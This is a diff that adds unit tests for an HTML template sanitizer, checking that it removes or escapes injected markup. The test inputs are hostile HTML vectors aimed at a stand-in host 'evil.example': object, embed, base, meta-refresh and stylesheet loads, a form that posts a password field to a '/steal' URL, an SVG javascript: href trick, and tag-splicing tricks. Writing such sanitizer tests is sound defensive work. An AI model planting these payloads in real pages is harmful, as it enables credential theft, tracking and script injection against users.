@@ -55,6 +55,108 @@ describe('template markup sanitization', () => {
       ),
     ).toBe('<section><a>x</a></section>');
   });
+
+  // The API rejects these on write, but this layer also renders rows saved
+  // before that rule, unsaved Studio drafts and headless input, so it has to
+  // remove them on its own.
+  it.each([
+    ['object', '<object data="https://evil.example/x.html" type="text/html"></object>'],
+    ['embed', '<embed src="https://evil.example/x.swf">'],
+    ['base', '<base href="https://evil.example/">'],
+    ['meta', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
+    ['link', '<link rel="stylesheet" href="https://evil.example/x.css">'],
+    ['style', '<style>body{background:url(https://evil.example/track)}</style>'],
+    ['applet', '<applet code="Evil.class"></applet>'],
+    ['frameset', '<frameset><frame src="https://evil.example/"></frameset>'],
+    ['template', '<template><p>hidden</p></template>'],
+    ['portal', '<portal src="https://evil.example/"></portal>'],
+  ])('removes <%s> and its content', (_tag, vector) => {
+    expect(sanitizeTemplateMarkup(`<p>before</p>${vector}<p>after</p>`)).toBe(
+      '<p>before</p><p>after</p>',
+    );
+  });
+
+  it('strips the submission target of a form instead of the form itself', () => {
+    expect(
+      sanitizeTemplateMarkup(
+        '<form action="https://evil.example/steal"><input name="p" type="password"></form>',
+      ),
+    ).toBe('<form><input name="p" type="password"></form>');
+    expect(
+      sanitizeTemplateMarkup(
+        '<button type="submit" formaction="https://evil.example/steal">x</button>',
+      ),
+    ).toBe('<button type="submit">x</button>');
+  });
+
+  it('removes the svg and mathml escape hatches', () => {
+    expect(
+      sanitizeTemplateMarkup(
+        '<svg><a href="/x"><animate attributeName="href" to="javascript&#58;alert(1)"></animate></a></svg>',
+      ),
+    ).toBe('<svg><a href="/x"></a></svg>');
+    expect(sanitizeTemplateMarkup('<svg><foreignObject><p>x</p></foreignObject></svg>')).toBe(
+      '<svg></svg>',
+    );
+    expect(
+      sanitizeTemplateMarkup('<svg><a><set attributeName="href" to="x"></set></a></svg>'),
+    ).toBe('<svg><a></a></svg>');
+  });
+
+  it('does not let a removed tag splice a new one out of its neighbours', () => {
+    expect(sanitizeTemplateMarkup('<obj<object>ect data="https://evil.example/x.html">')).toBe('');
+  });
+
+  it('neutralizes nesting deeper than the removal budget instead of rebuilding a tag', () => {
+    let vector = '<object data="x">';
+    for (let level = 0; level < 12; level += 1) {
+      vector = `<obj${vector}ect data="x">`;
+    }
+    expect(sanitizeTemplateMarkup(vector).toLowerCase()).not.toContain('<object');
+  });
+
+  it('keeps the markup the native blocks ship', () => {
+    const header =
+      '<label class="nv-theme-toggle-label" for="nv-theme-toggle">' +
+      '<input type="checkbox" id="nv-theme-toggle" class="nv-theme-toggle-input" />' +
+      '<span class="nv-theme-toggle-icon" aria-hidden="true"></span></label>';
+    const todo =
+      '<form class="nv-todo-create" data-nv-todo-form>' +
+      '<input id="nv-todo-title" type="text" placeholder="Add a task" required>' +
+      '<button class="nv-todo-add" type="submit">Add task</button></form>';
+    const content =
+      '<article><header><h2>Title</h2><time datetime="2026-01-01">Jan</time></header>' +
+      '<figure><img src="/a.png" alt=""><figcaption>Caption</figcaption></figure>' +
+      '<svg viewBox="0 0 16 16"><path d="M0 0h16v16H0z"></path></svg></article>';
+    expect(sanitizeTemplateMarkup(header)).toBe(header);
+    expect(sanitizeTemplateMarkup(todo)).toBe(todo);
+    expect(sanitizeTemplateMarkup(content)).toBe(content);
+  });
+
+  it('removes the same vectors through the full render pipeline', () => {
+    expect(
+      renderHtml(
+        '<section>' +
+          '<object data="https://evil.example/x.html" type="text/html"></object>' +
+          '<embed src="https://evil.example/x.swf">' +
+          '<base href="https://evil.example/">' +
+          '<meta http-equiv="refresh" content="0;url=https://evil.example">' +
+          '<link rel="stylesheet" href="https://evil.example/x.css">' +
+          '<style>body{background:url(https://evil.example/track)}</style>' +
+          '<form action="https://evil.example/steal"><input name="p" type="password"></form>' +
+          '<a href="/safe">ok</a>' +
+          '</section>',
+      ),
+    ).toBe(
+      '<section><form><input name="p" type="password"></form><a href="/safe">ok</a></section>',
+    );
+  });
+
+  it('cannot be reached through an interpolated prop value', () => {
+    expect(
+      renderHtml('<div>{{body}}</div>', { body: '<object data="https://evil.example/x.html">' }),
+    ).toBe('<div>&lt;object data=&quot;https://evil.example/x.html&quot;&gt;</div>');
+  });
 });
 
 describe('interpolate', () => {
